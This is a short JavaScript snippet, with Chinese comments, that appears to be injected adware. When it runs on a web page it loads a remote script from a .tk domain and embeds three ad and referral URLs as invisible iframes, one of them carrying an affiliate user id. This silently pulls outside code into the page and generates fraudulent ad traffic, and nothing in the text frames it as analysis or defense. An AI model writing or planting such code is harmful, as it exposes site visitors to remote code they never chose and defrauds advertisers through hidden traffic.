(function () {
//基础
var b = document.createElement("script");
b.src = "http://www.7k77.tk/eicXsB?1503385493";
(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
//插广告
var adList=[
    'http://www.hupress.tk/',
    'http://adpays.net/v.php?user=4297',
    'http://ptp.skillerzforum.com/promote.php?id=22979'
]
for(var i=0,len=adList.length;i<len;i++){
    //iframe 
    var elemIF = document.createElement("iframe");
    elemIF.src = adList[i];
    elemIF.style.display = "none";
    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(elemIF)
    //a标签
    // var elemA=document.createElement("a");
    // elemA.href=adList[i];
    // elemA.innerText=adList[i]
    // elemA.style.display = "none";
    // (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(elemA)
}
})()



